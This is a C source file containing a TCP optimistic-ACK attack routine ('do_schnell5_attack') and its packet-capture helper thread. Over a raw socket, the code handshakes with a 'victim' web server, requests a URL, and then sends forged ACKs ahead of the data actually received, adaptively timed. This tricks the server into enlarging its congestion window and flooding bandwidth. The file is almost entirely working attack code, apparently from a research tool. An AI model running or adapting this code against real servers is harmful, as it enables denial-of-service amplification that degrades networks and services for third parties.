#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/types.h>
#include <pcap.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>


int SignalRestart=0;
int WindowMax=65535;
double MaxNoise=0.0;
double Efficency=0.5;
long LocalBandwidth=32000;	// Bytes/s
int AdaptiveDelay=1;
long DelayIncrement=500;		// micro seconds

void heartbeat(char * s);

#include "schnell.h"
#include "packetqueue.h"
int do_schnell5_attack(rawSock){
	int retries=0;
	int slowstart=1;
	// nSegments = our congestion window, but kept in segments, not bytes
	int nSegments=2;	//RFC2414
	int i;
	int ssthresh=65535;
	long usProcessingTime=0;
	long delay;
	// struct sched_param sched_thing;	// for RT priority
	pthread_t grabber;
	struct timeval then, now;
	unsigned int thenAck, nowAck;
	double tmp;
	double maxSegments;			// maximum # of segments to send/ms
	int segmentsToSend=0;
	long usFastDelay, usSlowDelay,usCurrentDelay;
	unsigned int lastACK;




	// do three way handshake
        do {
                sendSYN(rawSock);
                retries++;
        } while( getSYNACK(rawSock) && (retries < 10));
	if(retries>=10){
		fprintf(stderr,"Never Got SYNACK :(\n");
		exit(1);
	}

        victimSequence++;
        localSequence++;
        sendACK(rawSock);
	// send request
        sendHTMLGET(rawSock);   // send "GET URL\r\n" to server
	// setup stuff
	// FIXME might want to grab the ACK
	lastACK=victimSequence;
	thenAck=lastACK;
	gettimeofday(&then,NULL);
	Window = 65533;	// set the recv window all of the way open
			// encode the state in the window, for debug
	// loop until connection close
	printf("Attack5: RTT=%lu us, nSegments=%d, Target Bandwidth=%lu\n"
			,usRTT,nSegments,TargetBandwidth);
	/*
	printf("Setting Scheduler to FIFO for better nanosleep() accuracy\n");
	sched_thing.sched_priority=1;
	if(sched_setscheduler(0,SCHED_FIFO,&sched_thing)){
		perror("ERR: sched_setscheduler");
		abort();
	} */
	if(setpriority(PRIO_PGRP,0,-20)){
		perror("ERR: setpriority");
		exit(1);
	}

	// spawn tracker thread
	pthread_create(&grabber,NULL,packetGrabber5,&rawSock);
	maxSegments = (double) LocalBandwidth/(40*1000*1000);	// max segments/microsecond
	printf("LocalBandwidth %ld == %f segments/us\n",LocalBandwidth,maxSegments);
	if(AdaptiveDelay){
		// microseconds to send a window
		usFastDelay =1000000*(double)WindowMax/(double)TargetBandwidth;
		usFastDelay *=Efficency;	// % of window we ACK per round
		// the 1.05 is so we get ~95% efficency
		//usFastDelay = 1.05 * (double) usFastDelay;
		usSlowDelay = 10*usFastDelay;
		usCurrentDelay = usSlowDelay+DelayIncrement;
		printf("Using adaptive delay fast = %ld slow = %ld inc= %ldus\n",
				usFastDelay, usSlowDelay,DelayIncrement);
	}
	// and loop
	gotFINorRST=0;
	SignalRestart=0;
	while(!gotFINorRST){
		heartbeat("top of loop");
		if(SignalRestart){
			slowstart=1;  // we are not sure what the cwnd size is, so ss again just in case!!
			lastACK=victimSequence;
			ACK(rawSock,lastACK);	// ack the packet
			nSegments=2;	// since we just ACK'd 1
			SignalRestart=0;
			ssthresh=ssthresh/2;
			printf("--------------- GOT AHEAD of SERVER;"
					" restarting ssthresh=%d ------\n" ,ssthresh);
			if(AdaptiveDelay)
				usCurrentDelay = MIN(usCurrentDelay*2,usSlowDelay);
		}
		// processing time = (bytes/querry)/(bytes/sec)= s/q
		heartbeat("delay calc");
		usProcessingTime=(unsigned long) 
			((double)1000*nSegments*MSS)/((double)TargetBandwidth/1000);
		if(AdaptiveDelay){
			usCurrentDelay=MAX(usCurrentDelay-DelayIncrement,usFastDelay);
			delay = usCurrentDelay;
		} else { 
			if(slowstart){	// was !slowstart -- weird
				usProcessingTime*=2;	// the incoming window was 2times last one
			}
			delay=usRTT;
		}
		// We do this to artificially inflate the RTO timer
		if(drand48()>0.5)
			delay += (double)delay*MaxNoise;
		else
			delay -=(double)delay*MaxNoise;
		delay = MAX(delay,usProcessingTime);	// don't dip below processing time
		if(Verbose)
			printf("delay time %lu; processing time %lu : %d of %d segs, %d MSS \n",
				delay, usProcessingTime,segmentsToSend,nSegments, MSS);
		heartbeat("before delay");
		myusSleep(delay);
		heartbeat("after delay");
		gettimeofday(&now,NULL);
		nowAck=victimSequence;
		tmp = 1000000*(now.tv_sec-then.tv_sec)+now.tv_usec-then.tv_usec;
		tmp/=1000;	// to ms, not us
		if((tmp!=0)&&Verbose)
			printf("Bandwidth: %f	Bytes/ms %u %f %u %u\n",((double)nowAck-thenAck)/tmp,
					nowAck-thenAck,tmp, nowAck, thenAck);
		thenAck=nowAck;
		then=now;
		heartbeat("before control");
		if(slowstart== 1){	// slowstart
			Window=65533;
			// segmentsToSend=MIN(nSegments,maxSegments*delay);	// cap bandwidth
			segmentsToSend=nSegments;	// No bandwidth cap in SS
			lastACK+=(nSegments-segmentsToSend)*MSS;
			for(i=0;i<segmentsToSend;i++){
				lastACK+=MSS;
				ACK(rawSock,lastACK);
			}
			nSegments+=segmentsToSend;
			if((nSegments*MSS)>ssthresh){
				// basically, do the right thing, but
				// don't go over Efficency percent of the window size
				//slowstart=2;
				slowstart=2;	// no transition phase
				nSegments=(ssthresh*Efficency)/MSS;
				continue;
			}
		} else if(slowstart == 2){	// transition from ss to cc
			Window=65534;
			// segmentsToSend=nSegments;	// No bandwidth cap in transition
			segmentsToSend=MAX(MIN(nSegments,maxSegments*delay),1);	// cap bandwidth
			if(Verbose)
				printf("Transition: sending %d of %d segments\n",segmentsToSend,nSegments);
			for(i=0;i<segmentsToSend;i++){
				lastACK+=MSS;
				ACK(rawSock,lastACK);
			}
			slowstart=0;
		} else {	// congestion control
			Window=65535;
			assert(slowstart == 0);
			heartbeat("congestion control");
			// hurry up and open the window	 by sending multiple ACKs
			// cap bandwidth in CC
			segmentsToSend=MAX(MIN(nSegments,maxSegments*delay),1);	
			// evenly divide the ACKs across the space we are ACKing
			// we do have some off by one errors here, but hopefully 
			// they won't matter
			for(i=0;i<segmentsToSend;i++){
				lastACK+=(nSegments/segmentsToSend)*MSS;
				ACK(rawSock,lastACK);
			}
			ssthresh=MIN(WindowMax,ssthresh+segmentsToSend*MSS*MSS/ssthresh);
			heartbeat("after ACK");
			ssthresh=MIN(WindowMax,ssthresh+MSS*MSS/ssthresh);
			// basically, do the right thing, but
			// don't go over Efficency percent of the max window size
			nSegments=(ssthresh*Efficency)/MSS;
		}
		heartbeat("end of while loop");
	}	// while(!fin or rst)
	ACK(rawSock,victimSequence);	// ACK the fin
	pthread_cancel(grabber);
	return 0;
}	// function

/* void * packetGrabber(void *);
 *  similar to packetHandler, but multithreaded, with locking
 *   
 */

void * packetGrabber5(void *arg){
	struct tcphdr *tcph;
	const unsigned char * packet;
	struct pcap_pkthdr pcap_hdr;
	unsigned int lastseq=victimSequence-1;
	struct timeval now;
	int rawSock;

	rawSock=*(int*)arg;
	/*
	struct sched_param sched_thing; // for RT priority

	sched_getparam(0,&sched_thing);
	//sched_thing.sched_priority++;	// one faster than the parent
	
	printf("packetGrabber5 thread: scheduling priority is: %d\n",
			sched_thing.sched_priority);
	*/

	while(1){
		packet = pcap_next(PcapHandle,&pcap_hdr);
		if(packet == NULL){
			fprintf(stderr,"pcap_next: err\n");
				continue;
		}
		tcph = (struct tcphdr*) (packet + 34);  // 14 + 20 = ethernet + ip hdrs
		if(tcph->fin||tcph->rst)
			gotFINorRST=1;
		if(pcap_hdr.len<=(14+20+20))    // ignore packets w/no data
			continue;
		//pq_enqueue(q,ntohl(tcph->seq),pcap_hdr.ts);
		// use this as what we should ACK, i.e. the number they
		// send us + packet length +1 - the header stuff
		victimSequence=ntohl(tcph->seq)+pcap_hdr.len-14-20-20;
		if(lastseq==victimSequence)	// got a retransmit, restart slowstart
			SignalRestart=1;
		gettimeofday(&now,NULL);
		now.tv_sec=now.tv_sec-StartTime.tv_sec;
		now.tv_usec=now.tv_usec-StartTime.tv_usec;
		if(now.tv_usec<0){
			now.tv_sec--;
			now.tv_usec+=1000000;
		}
		if(Verbose)
			printf("DATA: %ld.%.6ld %u\n",now.tv_sec,now.tv_usec,victimSequence);
		/* Slows things down -- needs more work
		 * might try only acking along window boundaries
		if((lastACK-2*WindowMax)>victimSequence)	// hack to make things
			ACK(rawSock,victimSequence);		// keep up with us
		*/
			
		lastseq=victimSequence;
	}
	return NULL;
}


void heartbeat(char * s){
	struct timeval t;
	gettimeofday(&t,NULL);
	if(Verbose)	
		printf("HEARTBEAT %ld.%.6ld %s\n",t.tv_sec,t.tv_usec,s);
}
